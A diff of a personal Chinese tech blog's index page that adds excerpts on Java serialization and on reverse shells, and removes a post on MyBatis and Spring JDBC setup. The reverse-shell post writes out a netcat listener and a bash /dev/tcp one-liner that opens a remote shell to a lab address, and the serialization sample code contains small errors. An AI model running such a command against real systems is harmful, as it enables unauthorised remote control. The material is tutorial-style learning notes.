@@ -164,6 +164,251 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-java序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/14/java%E5%BA%8F%E5%88%97%E5%8C%96/">java序列化</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/14/java%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
+  	<time datetime="2022-03-14T11:42:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="个人对序列化的印象"><a href="#个人对序列化的印象" class="headerlink" title="个人对序列化的印象"></a>个人对序列化的印象</h2><p>之前很少用过,通常我都是把一个对象转换成json,通过网络传输出去,再将json转换成对象,序列化只了解过,但未曾实际用过.学习vulhub介绍了java反序列化漏洞,因此需要完整学习一下,参考资料主要是java核心技术卷Ⅱ,2.3章节的内容.</p>
+<h2 id="保存和加载序列化对象"><a href="#保存和加载序列化对象" class="headerlink" title="保存和加载序列化对象"></a>保存和加载序列化对象</h2><p>当我们学习IO的处理流时会介绍到ObjectInputStream和ObjectOutputStream这两种处理流的类,用于存储和读取<strong>基本数据类型</strong>或者<strong>对象</strong>流</p>
+<p>其实IO的处理流的类都是”工具”类,用于解析流成我们需要的格式.</p>
+<p>如往employee.dat文件 存入对象,再读取回来:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> out=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;employee.dat&quot;</span>));</span><br><span class="line"><span class="comment">//new 两个对象出来</span></span><br><span class="line"><span class="keyword">var</span> harry=<span class="keyword">new</span> Employee(<span class="string">&quot;Harry Hacker&quot;</span>,<span class="number">5000</span>,<span class="number">1989</span>,<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> boss=<span class="keyword">new</span> Manager(<span class="string">&quot;Carl Cracker&quot;</span>,<span class="number">8000</span>,<span class="number">1987</span>,<span class="number">12</span>,<span class="number">15</span>);</span><br><span class="line"><span class="comment">//分别将这两个对象保存</span></span><br><span class="line">out.writeObject(harry);</span><br><span class="line">out.writeObject(boss);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> in=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;employee.dat&quot;</span>));</span><br><span class="line"><span class="keyword">var</span> e1=in.readObject();</span><br><span class="line"><span class="keyword">var</span> e2=in.readObject();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>若想对象实现以上的操作,则这些类必须实现Serializable接口:</p>
+<p><code>class Employee implements Serializable&#123;...&#125;</code></p>
+<p>但不需要实现任何方法</p>
+<p>重要情况:当一个对象被多个对象共享,作为共享的对象,被序列化时我们也要保证这一属性的一致性,但是我们并不能将对象的内存地址也保存下来,因为对象恢复时,也不可能恢复与原来完全相同的内存地址.</p>
+<p>因此每个对象被序列化时都会用一个序列号(serial number)保存的,如果第一次遇到,保存其对象数据到输出流中,如果以保存过,仅记录”与之前保存过的序列号为x的对象相同”.读取的过程也是如此;</p>
+<h3 id="对象序列化的文件格式"><a href="#对象序列化的文件格式" class="headerlink" title="对象序列化的文件格式"></a>对象序列化的文件格式</h3><p>略</p>
+<h3 id="修改默认的序列化机制"><a href="#修改默认的序列化机制" class="headerlink" title="修改默认的序列化机制"></a>修改默认的序列化机制</h3><p>某些数据域是不可以序列化的,如只对本地方法有意义的存储文件句柄,这种值传输到其他机器是没有用处的,甚至可能引起本地方法崩溃.java中将数据域标记为transient,来防止被序列化.</p>
+<p>对于含有transient标记的数据域的对象,序列化时,不能再直接由IO流进行自动序列化,需要实现具有下列签名的方法:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStrean in)</span>throw IOException,ClassNotFoundException</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteObject</span><span class="params">(ObjectOutputStrean out)</span>throw IOException,ClassNotFoundException</span></span><br></pre></td></tr></table></figure>
+
+<p>例:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LabeledPoint</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String label;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Point2D.Double point;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在writeObject方法中,先调用defaultWriteObject方法,写出对象描述符和String域label,这事ObjectOutputStream类中的一个特殊方法,他只能在<strong>可序列化类</strong>的writeObject方法中被调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">WriteObject</span><span class="params">(ObjectOutputStream out)</span>throw IOException,ClassNotFoundException</span>&#123;&#125;&#123;</span><br><span class="line">	out.defaultWriteObject();</span><br><span class="line">	out.writeDouble(point.getX());</span><br><span class="line">	out.writeDouble(point.getY());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span>throw IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">	in.defaultReadObject();</span><br><span class="line">    <span class="keyword">double</span> x=in.readObject();</span><br><span class="line">    <span class="keyword">double</span> x=in.readObject();</span><br><span class="line">    point=<span class="keyword">new</span> Point2D.Double(x,y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>即原来是:ObjectOutputStream.writeObject(需要保存的对象)或者ObjectInputStream.readObject();</p>
+<p>因为对象有了transient数据域后,该对象不能自动由IO流序列化了,需自己在类中实现相应方法</p>
+<p>**需要保存的对象.**writeObject(ObjectOutputStream)或者需要保存的对象.readObject(ObjectInputStream) </p>
+<h3 id="序列化单例和类型安全的枚举"><a href="#序列化单例和类型安全的枚举" class="headerlink" title="序列化单例和类型安全的枚举"></a>序列化单例和类型安全的枚举</h3><p>根据2.3.4节,单纯的enum结构无需担心枚举类型A序列化后反序列化A’,还是原来那个实例A==A’.</p>
+<p>但是文中提到的非enum结构的枚举类型A,在序列化后,再反序列化回来A’,一前一后的对象不相等</p>
+<p>需要按照文中提到的,添加readResolve方法</p>
+<h3 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h3><p>A类会不停的演变,从1.0版本演化到1.1,此时1.0版本可以读入1.1的序列化文件吗,1.1版本可以读入1.0的序列化文件吗,因为sha指纹会变化,理论上来说会将拒绝读入.但是类是可以对他的早期版本进行兼容的.</p>
+<p>原因是,我们在获取初版类的public static final long serialVersionUID=xxxxx</p>
+<p>此后的更新版本都要把serialVersionUID定义为同样的常量</p>
+<p>如果该类只有<strong>方法</strong>产生了变化,那么读入数据是<strong>不会</strong>有任何问题的.</p>
+<p>数据域发生了变化:</p>
+<p>旧文件对象比程序中的对象,有更多或者更少的数据域,或者数据域的类型可能有所不同.此时会尽全力进行转换:</p>
+<p>如果数据域名称匹配,类型不匹配,则不会进行转换.</p>
+<p>如果旧文件中的对象,拥有当前版本没有的数据域,则会忽略这些数据</p>
+<p>如果当前版本的数据域,旧文件中没有,则会赋予默认值</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/java//" class="article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/14/java%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-反弹shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/11/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/11/%E5%8F%8D%E5%BC%B9shell/" class="archive-article-date">
+  	<time datetime="2022-03-11T14:53:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h2><p>能够远程执行命令时,想要获取shell,可以使用反弹shell方法</p>
+<p>假设:</p>
+<p>目标机器:192.168.146.128</p>
+<p>本机:192.168.146.131</p>
+<h2 id="本机准备"><a href="#本机准备" class="headerlink" title="本机准备"></a>本机准备</h2><p>安装netcat:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install netcat</span><br></pre></td></tr></table></figure>
+
+<p>开放监听端口:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888(端口号)</span><br></pre></td></tr></table></figure>
+
+<p>监听所有外部ip与我端8888端口的连接</p>
+<p>注:如果出现以下报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc: getnameinfo: Temporary failure <span class="keyword">in</span> name resolution</span><br></pre></td></tr></table></figure>
+
+<p>name resolution表示无法识别某个域名,其实是0.0.0.0,表示所有ip地址</p>
+<p>验证:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ resolvectl query 0.0.0.0</span><br><span class="line">会报告错,没有域名服务器能识别该域名</span><br><span class="line">0.0.0.0: resolve call failed: No appropriate name servers or networks <span class="keyword">for</span> name found</span><br></pre></td></tr></table></figure>
+
+<p>解决方法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br><span class="line">添加:下列语句</span><br><span class="line">nameserver 8.8.8.8(搞不懂这样的原因)</span><br></pre></td></tr></table></figure>
+
+<p>此时再 <code>resolvectl query 0.0.0.0</code> ,可以识别</p>
+<p>此时再开放netcat监听即可</p>
+<h2 id="目标机器需要执行的命令"><a href="#目标机器需要执行的命令" class="headerlink" title="目标机器需要执行的命令"></a>目标机器需要执行的命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/(本机ip)/端口号 0&gt;&amp;1</span><br><span class="line">例:</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.131/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash是就是一个shell,即命令行解释工具,shell有很多种,如bash,dash,ash等,平时bash用的最多</p>
+<p>bash -i 表示打开一个交互式的bash,-i即interactive,交互式即必须有人和机器进行交互,即人要给出命令,让bash来执行.</p>
+<p>让bash来执行一个.sh脚本,就不是交互式的,命令都已经写好了</p>
+<h3 id="dev-tcp-ip-port"><a href="#dev-tcp-ip-port" class="headerlink" title="/dev/tcp/ip/port"></a>/dev/tcp/ip/port</h3><p>dev是设备(device)的英文缩写。这里主要存放与设备（包括外设）有关的文件，<strong>Linux一切皆文件</strong></p>
+<p> **/dev/tcp/**是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
+<p><strong>所以该命令就是与该ip:port 建立tcp连接</strong></p>
+<h3 id="gt-amp-和-0-gt-amp-1"><a href="#gt-amp-和-0-gt-amp-1" class="headerlink" title="&gt;&amp; 和  0&gt;&amp;1"></a>&gt;&amp; 和  0&gt;&amp;1</h3><p><strong>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件。</strong></p>
+<p><strong>所有执行I/O操作的系统调用都会通过文件描述符，即文件描述符可控制输入输出（输入/输出重定向****）</strong></p>
+<p><strong>标准输入(stdin):      代码为 0   使用 &lt; 或 &lt;&lt;     默认设备键盘</strong></p>
+<p><strong>标准输出(stdout):     代码为 1   使用 &gt; 或 &gt;&gt;     默认设备显示器</strong></p>
+<p><strong>标准错误输出(stderr): 代码为  2  使用 2&gt; 或 2&gt;&gt;   默认设备显示器</strong></p>
+<p><strong>&gt;&amp;</strong> 和  <strong>0&gt;&amp;1</strong>都有&gt;&amp;但是有不同的涵义</p>
+<p>单独的&gt;&amp; ,代表<strong>标准错误输出(stderr)合并到标准输出(stdout)中</strong> , <strong>&gt;&amp;word</strong> 等价于 <strong>&amp;&gt; word</strong>    都相当于    <strong>&gt; word</strong> <strong>2&gt;&amp;1</strong></p>
+<p>**&gt;&amp;**后面带有数字或者’-‘, 表示复制操作,如0&gt;&amp;1表示将标准输入(stdin)复制到了标准输出(stdout)里</p>
+<p><strong>本身这个bash -i   /dev/tcp/ip/port就已经将 1 默认重定位到了ip所在主机上,再&gt;&amp;将2重定向到1里,0&gt;&amp;1也将输入定位到了标准输出里,所以0,1,2全都定位到了ip所在主机上了</strong></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/security//" class="article-tag-list-link color4">security</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/11/%E5%8F%8D%E5%BC%B9shell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-vulhub系列1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1171,279 +1416,6 @@
 
 
   
-    <article id="post-论java连接数据库的各种姿势" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/08/%E8%AE%BAjava%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/">论java连接数据库的各种姿势</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/08/%E8%AE%BAjava%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/" class="archive-article-date">
-  	<time datetime="2021-12-08T09:06:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="使用Mybatis"><a href="#使用Mybatis" class="headerlink" title="使用Mybatis"></a>使用Mybatis</h1><p>目前感受到的好处:把所有的数据库curd操作命令,抽取出来,放入一个xml文件中便于管理</p>
-<p>step1.创建jdbc.properties文件,写入连接数据库的驱动,url,等</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/test</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=123456</span><br></pre></td></tr></table></figure>
-
-<p>step2.配置SqlMapConfig.xml文件,在此文件中配置数据库连接池datasource和Mapper文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--通过properties标签加载外部properties文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;jdbc.properties&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--数据源环境--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>step3.书写Mapper配置文件,可以有多个,只需在sqlmapconfig文件中添加即可,以查询User的UserMapper.xml为例</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;userMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.jinlei.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>step4.进行查询的连接,以测试类为例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(value=&#123;&quot;classpath:applicationContext.xml&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取核心配置文件</span></span><br><span class="line">        InputStream resourceAsStream= Resources.getResourceAsStream(<span class="string">&quot;sqlMapConfig.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//获取session工厂对象</span></span><br><span class="line">        SqlSessionFactory sqlSessionFactory=<span class="keyword">new</span> SqlSessionFactoryBuilder().build(resourceAsStream);</span><br><span class="line">        <span class="comment">//获得session回话对象</span></span><br><span class="line">        SqlSession sqlSession=sqlSessionFactory.openSession();</span><br><span class="line">        <span class="comment">//执行操作 参数:namespace+id</span></span><br><span class="line">        List&lt;User&gt; userList =sqlSession.selectList(<span class="string">&quot;userMapper.findAll&quot;</span>);</span><br><span class="line">        <span class="comment">//打印数据</span></span><br><span class="line">        System.out.println(userList);</span><br><span class="line">        <span class="comment">//释放资源</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="使用spring-jdbc"><a href="#使用spring-jdbc" class="headerlink" title="使用spring-jdbc"></a>使用spring-jdbc</h1><p>此为有spring和springmvc的情况下</p>
-<p>step1.创建jdbc.properties文件,写入连接数据库的驱动,url,等</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql:<span class="comment">//localhost:3306/test</span></span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p>step2.在spring配置文件applicationContext.xml中写入dataSource的bean和jdbctemplate的bean</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=</span></span><br><span class="line"><span class="tag">               <span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--加载外部的properties文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:property-placeholder</span>&gt;</span></span><br><span class="line">	 <span class="comment">&lt;!--配置数据源的datasource--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span 